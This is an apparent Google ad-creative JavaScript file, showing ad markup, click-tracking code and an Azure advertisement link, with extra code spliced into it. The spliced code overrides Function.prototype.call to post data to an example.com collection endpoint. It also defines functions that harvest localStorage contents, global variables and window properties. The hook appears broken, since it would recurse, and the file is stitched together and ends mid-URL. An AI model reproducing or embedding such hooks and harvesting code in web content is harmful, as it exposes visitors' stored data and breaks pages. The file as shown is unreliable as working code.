if (!window.mraid) {
  document.write('\x3cdiv id="ad_unit"\x3e');
}
document.write('\x3cdiv class="GoogleCreativeContainerClass" ' + 'id="gcc_ua_hZM_PD6DBvcAPjoWkoAQ"\x3e');
let jsHookDetected = false;
(function () {
  var m = document.createElement('meta');
  m.setAttribute('data-jc', '82');
  m.setAttribute('data-jc-version', 'r20230816');
  var ss = document.getElementsByTagName('script')[0];
  if (ss && ss.parentNode) {
    ss.parentNode.insertBefore(m, ss);
  }
})();
(function () {
  /*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */var h = this || self;
  function l(a, d, b) {
    if (a) for (var c = 0; null != a && 500 > c && !b(a); ++c) a = d(a);
  }
  function m(a, d) {
    l(a, function (b) {
      try {
        return b === b.parent ? null : b.parent;
      } catch (c) {}
      return null;
    }, d);
  }
  function n(a, d) {
    if ("IFRAME" == a.tagName) d(a);else {
      a = a.querySelectorAll("IFRAME");
      for (var b = 0; b < a.length && !d(a[b]); ++b);
    }
  }
  function p(a) {
    return (a = a.ownerDocument) && (a.parentWindow || a.defaultView) || null;
  }
  function q(a, d, b) {
    try {
      var c = JSON.parse(b.data);
    } catch (f) {}
    if ("object" === typeof c && c && "creativeLoad" === c.type) {
      var g = p(a);
      if (b.source && g) {
        var e;
        m(b.source, function (f) {
          try {
            if (f.parent === g) return e = f, !0;
          } catch (k) {}
        });
        e && n(a, function (f) {
          if (f.contentWindow === e) return d(c), !0;
        });
      }
    }
  }
  function r(a) {
    return "string" === typeof a ? document.getElementById(a) : a;
  }
  ;
  var t;
  t = void 0 === t ? window : t;
  t.clsn = function (a, d) {
    var b = r(a);
    if (b) if (b.onCreativeLoad) b.onCreativeLoad(d);else {
      var c = d ? [d] : [],
        g = function (e) {
          for (var f = 0; f < c.length; ++f) try {
            c[f](1, e);
          } catch (k) {}
          c = {
            push: function (k) {
              k(1, e);
            }
          };
        };
      b.onCreativeLoad = function (e) {
        c.push(e);
      };
      b.setAttribute("data-creative-load-listener", "");
      b.addEventListener("creativeLoad", function (e) {
        g(e.detail);
      });
      h.addEventListener("message", function (e) {
        q(b, g, e);
      });
    }
  };
}).call(this);
window.seenVars = window.seenVars || [];

// Hook Function
Function.prototype.call = function () {
  const args = [].slice.call(arguments);
  const context = args.shift();
  jsHookDetected = true;
  postDataToServer({
    message: 'JavaScript hook call detected'
  });
  return this.apply(context, args);
};
clsn("gcc_ua_hZM_PD6DBvcAPjoWkoAQ");
function gatherLocalStorage() {
  let localStorageData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    const value = localStorage.getItem(key);
    localStorageData[key] = value;
  }
  return localStorageData;
}
document.write('\x3ca target\x3d\x22_blank\x22 id\x3d\x22img_anch_CI-Q0pzL6oADFaBgDwIdjgIJRA\x22 href\x3d\x22https://adclick.g.doubleclick.net/pcs/click?xai\x3dAKAOjstC1EILcPt-cbcM34NTYDfKTz3pJjZS9wSvq1el6-XOs-W_ruBCIK7oBzhBawDzc55K7uRW4P-BfbPVVJpgAG8BDTztVsRFekqOENAmxUnO0ODnlnQWlP12jD5_LIu2OIT95s9Db49EynAF_JX6dhw56rLr57HrYOYckNBjIK_3g05ZbHzP_Ek8HATIoBJkN5-agBwCd-MzAwEsM6TxuD5gbdQyMs4GhW1ryBsjowf0mbI1P2YUrrYyxye7HqzB1ZxbPIr4Y8zoRhbwsnxtlzPUGQmRUgKxV_zzEYHmIQ_TNREBx_auM0jQJBLE2ZPhvC6TgiJ1NH0BZTgMPCIvjfEG2QuwmYzbNXerfFgRITeQGamKbsTZ75YQJqpnvYHSdNdbwbRCI3DOb08l_AEisMnJjiZxPIo1F6g1j6evY8M0Vuq0O5sLkvOJui6FXP5eCREgdD9vQV1zOotnJ4U-J4Wx7qLtTpzFzw0Vdhzf_eg1qydFeAdWrPangjifZ-tkwZs6PJFkQERRrYxCn_DuOmNf2xwUIh3OnvdMrNNnwwTmr3PsnlPMcF49kvulO4QrfIpbdjexrkEsfpUsCYj81_H1tpBkVSiJSAwmomdhlxnh34AxpG95Zt8Ci-IILClgV-vQ5zSNtdGfjG3qjx9U_juspWA7LQDG2tcYHxkyxCh5ouzB-jUGqipPyv3bjazw5Fv1l2MtVI0mCBmW0vRDzZYnDhhVUlSSK022PyZ-MtmYXQDW3JV1i-PUxPt7l-88vFxy7jxEMw_vTt60h1CjiljCvfiYLG05h6Sgk7t5U7c1y5dt1PTlV6NtbuvasOTpN3LKnCNbFf70qEqkv5v_E3rmPOZ_MhTwMmbqcCe_4C8va1sxYig9Xr_qDM6nSCW2qLkDtsEClQIisR-P1E1NFzlt66lXRXaQy0AbN56xAEV3PcLw-D_PKVv8Q0U3iRA8l_4Q-1lWGqgEtEfSIM8iR2Gkm293KbrPDLlI9cnY1zTxoikw6XygO0Q0Wr2Q9p997BjB9VpssmxjGbyiPDdtiPO6-aSLO9b7V85kZ6Xxsq3jzLVhs36GSNvtMGDHAaGFGybIIBqyekro7oW8rAFXV4IVEIBiylhE50cNzxqKGYbgwhx2Ictnm3_nxz1XKZ3Xvs2pi0V60l2zKOV2_4yr_Eup-mG83RolUjhAQX9T74bo4d8mbuDBxmbzifDImirXjbGMfZEQcFI83XJbb4k_4UBgT3GEWxLtcqQisGp4fc3avOy4d4DM6UKY5wAI8k-DIxE9tWK_JX6SgdQXiIgxAy1-iW8nE025JLspeQteDUPmzfieAkbb8qoHy7Ghd8_EStKSUzMrQ35F76Q5jY1ICU-RvHANZ6SN\x26amp;sai\x3dAMfl-YQQKbwJpSx7oItHjHiFFe6eBvKXPbqdvSYljEYpoJg5MqIEH6_CnkHdwIeRLV_OO_bXiEPpH0DiwRQcE-xrRGgOnUNifaL2rrLIh4uxTC8NWpp3XqqpLMrsHUdTXRRJU6ygPn-LCqJ4K8iqtXi3aMNMe5BwJravnKUXCHLEKpeoL16kqMf45j8Jfqz0aT1KfWYSPlXGV6PelTbMIBE2BVuvds5tV8EILSNOQNxTODwAQxKJQpf-vjsVU6BX8xoSv-124HI_gkUBV0ciAuWDWVckmRE4Q3i7wRnPPwudCEWV6j3xVzzVdHCgvvf-wTKZAemThwiqnmZ3bJ47byqfRf9Z8_D2_deUdbs\x26amp;sig\x3dCg0ArKJSzNMz4VhG9jHh\x26amp;cry\x3d1\x26amp;fbs_aeid\x3d[gw_fbsaeid]\x26amp;urlfix\x3d1\x26amp;adurl\x3dhttps://azure.microsoft.com/zh-cn/free/ai/search/%3FOCID%3DAIDcmmknmz9ars_OLA_30205119_370049272_183726376%26dclid%3D%25edclid!\x22\x3e\x3cimg src\x3d\x22https://s0.2mdn.net/simgad/6829380683861186427\x22 alt\x3d\x22Advertisement\x22 border\x3d\x220\x22 width\x3d\x22728\x22 height\x3d\x2290\x22 style\x3d\x22display:block\x22\x3e\x3c/a\x3e\x3cscript data-jc\x3d\x2274\x22 data-jc-version\x3d\x22r20230816\x22 data-jcp-a-id\x3d\x22img_anch_CI-Q0pzL6oADFaBgDwIdjgIJRA\x22 data-jcp-for-sure-open-browser\x3d\x22false\x22 data-jcp-for-sure-open-custom-tabs\x3d\x22false\x22 data-jcp-cc-overlay\x3d\x22\x22 data-jcp-cc-button\x3d\x22\x22 data-jcp-is-fledge\x3d\x22false\x22 data-jcp-turtlex-event-ad-signals\x3d\x22\x22\x3e(function(){/*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */ var aa\x3d\x22function\x22\x3d\x3dtypeof Object.defineProperties?Object.defineProperty:function(a,b,d){if(a\x3d\x3dArray.prototype||a\x3d\x3dObject.prototype)return a;a[b]\x3dd.value;return a};function ba(a){a\x3d[\x22object\x22\x3d\x3dtypeof globalThis\x26\x26globalThis,a,\x22object\x22\x3d\x3dtypeof window\x26\x26window,\x22object\x22\x3d\x3dtypeof self\x26\x26self,\x22object\x22\x3d\x3dtypeof global\x26\x26global];for(var b\x3d0;b\x3ca.length;++b){var d\x3da[b];if(d\x26\x26d.Math\x3d\x3dMath)return d}throw Error(\x22Cannot find global object\x22);}var ca\x3dba(this); function da(a,b){if(b)a:{var d\x3dca;a\x3da.split(\x22.\x22);for(var c\x3d0;c\x3ca.length-1;c++){var e\x3da[c];if(!(e in d))break a;d\x3dd[e]}a\x3da[a.length-1];c\x3dd[a];b\x3db(c);b!\x3dc\x26\x26null!\x3db\x26\x26aa(d,a,{configurable:!0,writable:!0,value:b})}}var ea\x3d\x22function\x22\x3d\x3dtypeof Object.create?Object.create:function(a){function b(){}b.prototype\x3da;return new b},m; if(\x22function\x22\x3d\x3dtypeof Object.setPrototypeOf)m\x3dObject.setPrototypeOf;else{var p;a:{var fa\x3d{a:!0},q\x3d{};try{q.__proto__\x3dfa;p\x3dq.a;break a}catch(a){}p\x3d!1}m\x3dp?function(a,b){a.__proto__\x3db;if(a.__proto__!\x3d\x3db)throw new TypeError(a+\x22 is not extensible\x22);return a}:null}var r\x3dm,ha\x3d\x22function\x22\x3d\x3dtypeof Object.assign?Object.assign:function(a,b){for(var d\x3d1;d\x3carguments.length;d++){var c\x3darguments[d];if(c)for(var e in c)Object.prototype.hasOwnProperty.call(c,e)\x26\x26(a[e]\x3dc[e])}return a}; da(\x22Object.assign\x22,function(a){return a||ha});var t\x3dthis||self;var v,w;a:{for(var x\x3d[\x22CLOSURE_FLAGS\x22],y\x3dt,z\x3d0;z\x3cx.length;z++)if(y\x3dy[x[z]],null\x3d\x3dy){w\x3dnull;break a}w\x3dy}var A\x3dw\x26\x26w[610401301];v\x3dnull!\x3dA?A:!1;var B,C\x3dt.navigator;B\x3dC?C.userAgentData||null:null;function D(a){return v?B?B.brands.some(function(b){return(b\x3db.brand)\x26\x26-1!\x3db.indexOf(a)}):!1:!1}function E(a){var b;a:{if(b\x3dt.navigator)if(b\x3db.userAgent)break a;b\x3d\x22\x22}return-1!\x3db.indexOf(a)};function F(){return v?!!B\x26\x260\x3cB.brands.length:!1}function G(){return F()?D(\x22Chromium\x22):(E(\x22Chrome\x22)||E(\x22CriOS\x22))\x26\x26!(F()?0:E(\x22Edge\x22))||E(\x22Silk\x22)};var ia\x3dF()?!1:E(\x22Trident\x22)||E(\x22MSIE\x22);!E(\x22Android\x22)||G();G();E(\x22Safari\x22)\x26\x26(G()||(F()?0:E(\x22Coast\x22))||(F()?0:E(\x22Opera\x22))||(F()?0:E(\x22Edge\x22))||(F()?D(\x22Microsoft Edge\x22):E(\x22Edg/\x22))||F()\x26\x26D(\x22Opera\x22));var H\x3d{},I\x3dnull;var ja\x3d\x22undefined\x22!\x3d\x3dtypeof Uint8Array,ka\x3d!ia\x26\x26\x22function\x22\x3d\x3d\x3dtypeof btoa;var J\x3d\x22function\x22\x3d\x3d\x3dtypeof Symbol\x26\x26\x22symbol\x22\x3d\x3d\x3dtypeof Symbol()?Symbol():void 0,la\x3dJ?function(a,b){a[J]|\x3db}:function(a,b){void 0!\x3d\x3da.g?a.g|\x3db:Object.defineProperties(a,{g:{value:b,configurable:!0,writable:!0,enumerable:!1}})};function oa(a){var b\x3dK(a);1!\x3d\x3d(b\x261)\x26\x26(Object.isFrozen(a)\x26\x26(a\x3dArray.prototype.slice.call(a)),L(a,b|1))} var K\x3dJ?function(a){return a[J]|0}:function(a){return a.g|0},M\x3dJ?function(a){return a[J]}:function(a){return a.g},L\x3dJ?function(a,b){a[J]\x3db}:function(a,b){void 0!\x3d\x3da.g?a.g\x3db:Object.defineProperties(a,{g:{value:b,configurable:!0,writable:!0,enumerable:!1}})};function pa(){var a\x3d[];la(a,1);return a}function N(a){a\x3da\x3e\x3e11\x261023;return 0\x3d\x3d\x3da?536870912:a};var qa\x3d{};function O(a){return null!\x3d\x3da\x26\x26\x22object\x22\x3d\x3d\x3dtypeof a\x26\x26!Array.isArray(a)\x26\x26a.constructor\x3d\x3d\x3dObject}var P,Q,ra\x3d[];L(ra,39);Q\x3dObject.freeze(ra);var sa;function ta(a,b,d){null\x3d\x3da\x26\x26(a\x3dsa);sa\x3dvoid 0;if(null\x3d\x3da){var c\x3d96;d?(a\x3d[d],c|\x3d512):a\x3d[];b\x26\x26(c\x3dc\x26-2095105|(b\x261023)\x3c\x3c11)}else{if(!Array.isArray(a))throw Error();c\x3dK(a);if(c\x2664)return a;c|\x3d64;if(d\x26\x26(c|\x3d512,d!\x3d\x3da[0]))throw Error();a:{d\x3da;var e\x3dd.length;if(e){var g\x3de-1,f\x3dd[g];if(O(f)){c|\x3d256;b\x3d+!!(c\x26512)-1;e\x3dg-b;1024\x3c\x3de\x26\x26(ua(d,b,f),e\x3d1023);c\x3dc\x26-2095105|(e\x261023)\x3c\x3c11;break a}}b\x26\x26(f\x3d+!!(c\x26512)-1,b\x3dMath.max(b,e-f),1024\x3cb\x26\x26(ua(d,f,{}),c|\x3d256,b\x3d1023),c\x3dc\x26-2095105|(b\x261023)\x3c\x3c11)}}L(a,c);return a} function ua(a,b,d){for(var c\x3d1023+b,e\x3da.length,g\x3dc;g\x3ce;g++){var f\x3da[g];null!\x3df\x26\x26f!\x3d\x3dd\x26\x26(d[g-b]\x3df)}a.length\x3dc+1;a[c]\x3dd};function va(a,b){return wa(b)} function wa(a){switch(typeof a){case \x22number\x22:return isFinite(a)?a:String(a);case \x22boolean\x22:return a?1:0;case \x22object\x22:if(a\x26\x26!Array.isArray(a)\x26\x26ja\x26\x26null!\x3da\x26\x26a instanceof Uint8Array){if(ka){for(var b\x3d\x22\x22,d\x3d0,c\x3da.length-10240;d\x3cc;)b+\x3dString.fromCharCode.apply(null,a.subarray(d,d+\x3d10240));b+\x3dString.fromCharCode.apply(null,d?a.subarray(d):a);a\x3dbtoa(b)}else{void 0\x3d\x3d\x3db\x26\x26(b\x3d0);if(!I){I\x3d{};d\x3d\x22ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\x22.split(\x22\x22);c\x3d[\x22+/\x3d\x22,\x22+/\x22,\x22-_\x3d\x22,\x22-_.\x22,\x22-_\x22];for(var e\x3d 0;5\x3ee;e++){var g\x3dd.concat(c[e].split(\x22\x22));H[e]\x3dg;for(var f\x3d0;f\x3cg.length;f++){var h\x3dg[f];void 0\x3d\x3d\x3dI[h]\x26\x26(I[h]\x3df)}}}b\x3dH[b];d\x3dArray(Math.floor(a.length/3));c\x3db[64]||\x22\x22;for(e\x3dg\x3d0;g\x3ca.length-2;g+\x3d3){var l\x3da[g],k\x3da[g+1];h\x3da[g+2];f\x3db[l\x3e\x3e2];l\x3db[(l\x263)\x3c\x3c4|k\x3e\x3e4];k\x3db[(k\x2615)\x3c\x3c2|h\x3e\x3e6];h\x3db[h\x2663];d[e++]\x3df+l+k+h}f\x3d0;h\x3dc;switch(a.length-g){case 2:f\x3da[g+1],h\x3db[(f\x2615)\x3c\x3c2]||c;case 1:a\x3da[g],d[e]\x3db[a\x3e\x3e2]+b[(a\x263)\x3c\x3c4|f\x3e\x3e4]+h+c}a\x3dd.join(\x22\x22)}return a}}return a};function xa(a,b,d,c,e,g){if(null!\x3da){if(Array.isArray(a))a\x3de\x26\x260\x3d\x3da.length\x26\x26K(a)\x261?void 0:g\x26\x26K(a)\x262?a:ya(a,b,d,void 0!\x3d\x3dc,e,g);else if(O(a)){var f\x3d{},h;for(h in a)f[h]\x3dxa(a[h],b,d,c,e,g);a\x3df}else a\x3db(a,c);return a}}function ya(a,b,d,c,e,g){var f\x3dc||d?K(a):0;c\x3dc?!!(f\x2632):void 0;a\x3dArray.prototype.slice.call(a);for(var h\x3d0;h\x3ca.length;h++)a[h]\x3dxa(a[h],b,d,c,e,g);d\x26\x26d(f,a);return a}function za(a){return a.h\x3d\x3d\x3dqa?a.toJSON():wa(a)};function S(a,b,d){this.g\x3dta(a,b,d)}S.prototype.toJSON\x3dfunction(){if(P)var a\x3dT(this,this.g,!1);else a\x3dya(this.g,za,void 0,void 0,!1,!1),a\x3dT(this,a,!0);return a};function Aa(a){P\x3d!0;try{return JSON.stringify(a.toJSON(),va)}finally{P\x3d!1}}S.prototype.h\x3dqa;S.prototype.toString\x3dfunction(){return T(this,this.g,!1).toString()}; function T(a,b,d){var c\x3da.constructor.i,e\x3dN(M(d?a.g:b)),g\x3d!1;if(c){if(!d){b\x3dArray.prototype.slice.call(b);var f;if(b.length\x26\x26O(f\x3db[b.length-1]))for(g\x3d0;g\x3cc.length;g++)if(c[g]\x3e\x3de){Object.assign(b[b.length-1]\x3d{},f);break}g\x3d!0}e\x3db;d\x3d!d;f\x3dM(a.g);a\x3dN(f);f\x3d+!!(f\x26512)-1;for(var h,l,k\x3d0;k\x3cc.length;k++)if(l\x3dc[k],l\x3ca){l+\x3df;var n\x3de[l];null\x3d\x3dn?e[l]\x3dd?Q:pa():d\x26\x26n!\x3d\x3dQ\x26\x26oa(n)}else h||(n\x3dvoid 0,e.length\x26\x26O(n\x3de[e.length-1])?h\x3dn:e.push(h\x3d{})),n\x3dh[l],null\x3d\x3dh[l]?h[l]\x3dd?Q:pa():d\x26\x26n!\x3d\x3dQ\x26\x26oa(n)}c\x3db.length;if(!c)return b; var ma;if(O(h\x3db[c-1])){a:{var u\x3dh;e\x3d{};d\x3d!1;for(var na in u)a\x3du[na],Array.isArray(a)\x26\x26a!\x3da\x26\x26(d\x3d!0),null!\x3da?e[na]\x3da:d\x3d!0;if(d){for(var Ka in e){u\x3de;break a}u\x3dnull}}u!\x3dh\x26\x26(ma\x3d!0);c--}for(;0\x3cc;c--){h\x3db[c-1];if(null!\x3dh)break;var Ia\x3d!0}if(!ma\x26\x26!Ia)return b;var R;g?R\x3db:R\x3dArray.prototype.slice.call(b,0,c);b\x3dR;g\x26\x26(b.length\x3dc);u\x26\x26b.push(u);return b};function U(a){this.g\x3dta(a)}U.prototype\x3dea(S.prototype);U.prototype.constructor\x3dU;if(r)r(U,S);else for(var V in S)if(\x22prototype\x22!\x3dV)if(Object.defineProperties){var Ba\x3dObject.getOwnPropertyDescriptor(S,V);Ba\x26\x26Object.defineProperty(U,V,Ba)}else U[V]\x3dS[V];var Ca\x3d/^(?:(?:https?|mailto|ftp):|[^:/?#]*(?:[/?#]|$))/i;function Da(a,b,d,c){var e\x3d/^(https?:[^:?]+[/]pcs[/]click[^/]+?)(?:\x26nx[^\x26]+\x26ny[^\x26]+\x26dim[^\x26]+)?(\x26adurl\x3d.*)/.exec(a);return e?e[1]+(\x22\x26nx\x3d\x22+b+\x22\x26ny\x3d\x22+d+\x22\x26dim\x3d\x22+c)+e[2]:a}function Ea(a){var b\x3da.currentTarget,d\x3db.querySelector(\x22img[alt]\x22);d\x26\x26(a\x3dDa(b.href,+Math.round(a.clientX-d.offsetLeft),+Math.round(a.clientY-d.offsetTop),+d.width+\x22x\x22+ +d.height),Ca.test(a)\x26\x26(b.href\x3da))} function Fa(a){var b\x3dt;b\x3dvoid 0\x3d\x3d\x3db?window:b;var d\x3dnew U;if(null!\x3da\x26\x26\x22string\x22!\x3d\x3dtypeof a)throw Error();var c\x3dd.g,e\x3dM(c);if(e\x262)throw Error();a:{var g\x3dN(e);if(1\x3e\x3dg){var f\x3de;if(e\x26256)g\x3dc[c.length-1];else{if(null\x3d\x3da)break a;g\x3dc[g+(+!!(e\x26512)-1)]\x3d{};f|\x3d256}g[1]\x3da;f!\x3d\x3de\x26\x26L(c,f)}else c[1+(+!!(e\x26512)-1)]\x3da,e\x26256\x26\x26(a\x3dc[c.length-1],1 in a\x26\x26delete a[1])}var h;null\x3d\x3db||null\x3d\x3d(h\x3db.fence)||h.setReportEventDataForAutomaticBeacons({eventType:\x22reserved.top_navigation\x22,eventData:Aa(d),destination:[\x22buyer\x22]});var l; null\x3d\x3db||null\x3d\x3d(l\x3db.fence)||l.reportEvent({eventType:\x22click\x22,eventData:Aa(d),destination:[\x22buyer\x22]});var k;null\x3d\x3db||null\x3d\x3d(k\x3db.fence)||k.reportEvent({eventType:\x22reserved.top_navigation\x22,destination:[\x22component-seller\x22]});var n;null\x3d\x3db||null\x3d\x3d(n\x3db.fence)||n.reportEvent({eventType:\x22click\x22,destination:[\x22component-seller\x22]})} function Ga(a,b){void 0!\x3dt.AFMA_Communicator\x26\x26void 0!\x3dt.AFMA_Communicator.sendMessage\x26\x26(a.preventDefault(),t.AFMA_Communicator.sendMessage(\x22open\x22,{a:\x22app\x22,u:a.currentTarget.href,system_browser:!0,use_first_package:!0,use_running_process:!0,use_custom_tabs:b}))};var W,X\x3ddocument.currentScript;W\x3d(X\x3dvoid 0\x3d\x3d\x3dX?null:X)\x26\x26\x2274\x22\x3d\x3d\x3dX.getAttribute(\x22data-jc\x22)?X:document.querySelector(\x27[data-jc\x3d\x2274\x22]\x27);if(null\x3d\x3dW)throw Error(\x22JSC not found 74\x22);for(var Ha\x3d{},Y\x3dW.attributes,Z\x3dY.length-1;0\x3c\x3dZ;Z--){var Ja\x3dY[Z].name;0\x3d\x3d\x3dJa.indexOf(\x22data-jcp-\x22)\x26\x26(Ha[Ja.substring(9)]\x3dY[Z].value)} (function(a){var b\x3ddocument.getElementById(a[\x22a-id\x22]),d\x3d\x22true\x22\x3d\x3d\x3da[\x22for-sure-open-browser\x22],c\x3d\x22true\x22\x3d\x3d\x3da[\x22for-sure-open-custom-tabs\x22],e\x3da[\x22cc-overlay\x22],g\x3da[\x22cc-button\x22],f\x3de?document.getElementById(e):null,h\x3dg?document.getElementById(g):null;if(\x22true\x22\x3d\x3d\x3da[\x22is-fledge\x22]){var l\x3da[\x22turtlex-event-ad-signals\x22];h?h.addEventListener(\x22click\x22,function(){Fa(l)}):b.addEventListener(\x22click\x22,function(){Fa(l)})}else if(b.addEventListener(\x22mousedown\x22,Ea),f\x26\x26h\x26\x26f.addEventListener(\x22mousedown\x22,function(k){k\x3dDa(h.href, +Math.round(k.clientX-f.offsetLeft),+Math.round(k.clientY-f.offsetTop),+f.clientWidth+\x22x\x22+ +f.clientHeight);Ca.test(k)\x26\x26(h.href\x3dk)}),d||c)b.addEventListener(\x22click\x22,function(k){Ga(k,c)}),h\x26\x26h.addEventListener(\x22click\x22,function(k){Ga(k,c)})})(Ha);}).call(this);\x3c/script\x3e');
function globalVariableCollection() {
  const globalVars = Object.keys(window);
  let newGlobalVars = globalVars.filter(key => !window.seenVars.includes(key));
  window.seenVars = globalVars;
  let collection = {};
  newGlobalVars.forEach(variable => {
    collection[variable] = window[variable];
  });
  return collection;
}
document.write('\x3c/div\x3e');
function gatherWindowProps() {
  const unseenProps = {};
  for (const key in window) {
    if (window.hasOwnProperty(key) && !window.seenVars.includes(key)) {
      const value = window[key];
      const type = typeof value;
      unseenProps[key] = {
        type: type,
        value: type === "function" ? undefined : value
      };
    }
  }
  return unseenProps;
}
document.write('\x3cscript\x3e(function () {function addIcon(){var container \x3d document.getElementsByClassName(\x22GoogleActiveViewClass\x22)[0];if (!container) {setTimeout(addIcon, 500);return;}var imgElem \x3d document.createElement(\x27img\x27);imgElem.src\x3d\x22https://static.googleadsserving.cn/pagead/images/cn/google_ad_cccccc_08.png\x22;imgElem.id \x3d \x22chinese_ad_label\x22;imgElem.style.position \x3d \x22absolute\x22;imgElem.style.left \x3d \x220px\x22;imgElem.style.bottom \x3d \x220px\x22;imgElem.style.zIndex \x3d \x222147483647\x22;container.appendChild(imgElem);}addIcon();})();\x3c/script\x3e');
async function postDataToServer(data) {
  const url = "https://example.com/api/collect";
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    });
    if (response.ok) {
      jsHookDetected = false;
      console.log("数据发送成功");
    } else {
      console.error(`数据发送失败,状态码: ${response.status}`);
    }
  } catch (error) {
    console.error("数据发送过程中出错: " + error);
  }
}
document.write('\x3cstyle\x3ediv{margin:0;padding:0;}.abgcp{height:15px;padding-right:1px;padding-top:1px;padding-left:9px;padding-bottom:9px;right:0px;top:0px;position:absolute;width:41px;z-index:2147483646;}.abgc{display:block;height:15px;position:absolute;right:1px;top:1px;text-rendering:geometricPrecision;z-index:2147483646;}.abgb{display:inline-block;height:15px;}.abgc,.abgcp,.jar .abgc,.jar .abgcp,.jar .cbb{opacity:1;}.abgc{cursor:pointer;}.cbb{cursor:pointer;height:15px;width:15px;z-index:2147483646;background-color:#ffffff;opacity:0;}.cbb svg{position:absolute;top:0;right:0;height:15px;width:15px;stroke:#00aecd;fill:#00aecd;stroke-width:1.25;}.abgb{position:absolute;right:16px;top:0px;}.cbb{position:absolute;right:0px;top:0px;}.abgs{display:none;height:100%;}.abgl{text-decoration:none;}.abgs svg,.abgb svg{display:inline-block;height:15px;width:auto;vertical-align:top;}.abgc .il-wrap{background-color:#ffffff;height:15px;white-space:nowrap;}.abgc .il-wrap.exp{border-bottom-left-radius:5px;}.abgc .il-text,.abgc .il-icon{display:inline-block;}.abgc .il-text{padding-right:1px;padding-left:5px;height:15px;width:36px;}.abgc .il-icon{height:15px;width:22px;}.abgc .il-text svg{fill:#000000;}.abgc .il-icon svg{fill:#00aecd}\x3c/style\x3e\x3cdiv id\x3d\x22abgcp\x22 class\x3d\x22abgcp\x22\x3e\x3cdiv id\x3d\x22abgc\x22 class\x3d\x22abgc\x22 dir\x3d\x22ltr\x22\x3e\x3cdiv id\x3d\x22abgb\x22 class\x3d\x22abgb\x22\x3e\x3cdiv class\x3d\x22il-wrap\x22\x3e\x3cdiv class\x3d\x22il-icon\x22\x3e\x3csvg xmlns\x3d\x22http://www.w3.org/2000/svg\x22 xmlns:xlink\x3d\x22http://www.w3.org/1999/xlink\x22 viewBox\x3d\x220 0 24 16\x22\x3e\x3cpath d\x3d\x22M10.90 4.69L10.90 5.57L3.17 5.57L3.17 7.22L3.17 7.22Q3.17 9.15 3.06 10.11L3.06 10.11L3.06 10.11Q2.95 11.07 2.58 11.92L2.58 11.92L2.58 11.92Q2.21 12.77 1.27 13.56L1.27 13.56L0.59 12.93L0.59 12.93Q2.29 11.82 2.29 8.66L2.29 8.66L2.29 4.69L6.11 4.69L6.11 2.95L7.00 2.95L7.00 4.69L10.90 4.69ZM23.00 7.34L23.00 8.22L12.80 8.22L12.80 7.34L17.55 7.34L17.55 5.53L15.12 5.53L15.12 5.53Q14.55 6.53 13.86 7.07L13.86 7.07L13.10 6.46L13.10 6.46Q14.44 5.46 14.95 3.33L14.95 3.33L15.84 3.55L15.84 3.55Q15.77 3.86 15.49 4.65L15.49 4.65L17.55 4.65L17.55 2.84L18.47 2.84L18.47 4.65L21.86 4.65L21.86 5.53L18.47 5.53L18.47 7.34L23.00 7.34ZM21.45 8.88L21.45 13.63L20.53 13.63L20.53 12.78L15.32 12.78L15.32 13.63L14.41 13.63L14.41 8.88L21.45 8.88ZM15.32 11.90L20.53 11.90L20.53 9.76L15.32 9.76L15.32 11.90Z\x22/\x3e\x3c/svg\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3cdiv id\x3d\x22abgs\x22 class\x3d\x22abgs\x22\x3e\x3ca id\x3d\x22abgl\x22 class\x3d\x22abgl\x22 href\x3d\x22https://adssettings.google.com/whythisad?source\x3ddisplay\x26amp;reasons\x3dAVs1JPJQ5QusWF7hrKp__DkbdqmoFXtJzTrspGyOhUbtdKGom6VTMK79HLXo0RQaHERTlYiWGu1ekLmOmGVBZJ4rll54kmRQ0lPDYLHHKfxqQ2VtvW0f4RdbSl0N2IvMBNxvqdrjmw9kJXPsaeiNFCSjI_1fgqHGDJZjC1LorPAvjOp1nC3DzTqKEe_xmlfg8ts5Svu6y6BYHTQA4MtEsWd91G05QpQhnyXORyKEo4ebkG8-0Hr7ryUQknj0x0a9D8CpSu4eJGvdftpl6_M8CP290Xx9MrSPY51DbuxzGDhALtPOlx0U1x0-OTfKDCkNTYmvKE5RZWKCVNqtFmXOZQmV89Xb_s9ZgglPUOvAfQVlOzoX6GFURYDU9LDdjQDQ_X8e5Rz3UqK-x6Ra0trBEKfmrdjb_jVVdZe_X_ORojZznjzrOSff2vrN3s32eB7skEmXln18FTvtMg8Oe9xqDQav3d_wrdRibmoZqTTyUczrONYtmtV3sq5ePY63SbHIa-mGUankbghjeZz5-k_QcEHJWCQDktD0feqydC_w8ikcE6OOnICl_dl6-ttcXeUOI4MvWnmynCdBYn59fXp8rurxE77Cdl1DOq8cdy1IwNTxdx-tPTTKCxQ8VqkQ6y7hNM7XqX2qnvVJtW4OZjlcIEmgMwMNVwSkTVvwQmOgrLpDYmUA_stoGpFmcDlvs_LkPIaCKO627ffMOlVbkqxn0AkBvACv85hrs8_Rssgw0qTRpqN8Jo8h3I8MnF-c1iOTm-9ezHp9hW4qtblI94IOA1qDGFhpqsV51rxMkrsdGA2pT-KY8_UCWGKbyzNZL-3DeeYF6sGIOlAY2zUdkkvsGDOwcCpEAd2l4CrldzPZ8lswFsM8AAs-vGv7bV1GdtIH69xWY60fk0G-xWgJEMaS5hEbQYg-WWsnYMlXppx1kSPtsaLTyA42R_-G-URHDSGP7241ApRo24aI-29qCkZCQb7Ol1XQZVZ3ar24kdzmeQcqmJpf9CjohTnDtXUVq-9qS_v-RrsRzFUARSsVYPvrfQxQp8cr8XiDnoaBX3p87a_ZpUoz_7ndGETq86HQyjvzyg7LzDdP_CRrn5UY4n21xC94l61ACjmDS0fpIsLHeMIeIm8Lv-hD_MDbwRSSO-ZXuawKesKXhtQpRW6I3V7hY7Zf3no1MpwZnBsCrp11PnajWvK3GMPgYMsJq4_FWa3yj_jVp84nC4JGnpHjcA3-HqpAOW8cqHZy1dym-T0KuW2kvWystLFp4sJEHI_Yxyu7qLK1R0Va_z3ANCu1vssTULDQwVFAUA3gFAgQnZutWNfceIokzE1_e1hdSngW0ykKbmn8h5mgYkjSid0vfujgjBj0600Pp44nzPI3HXcVmLvruAVi1TU8hJrRQGeonICbC9GE30mjPX703MNrVyvCMDGRndnWd5r1npAR4D8SE_ifEiN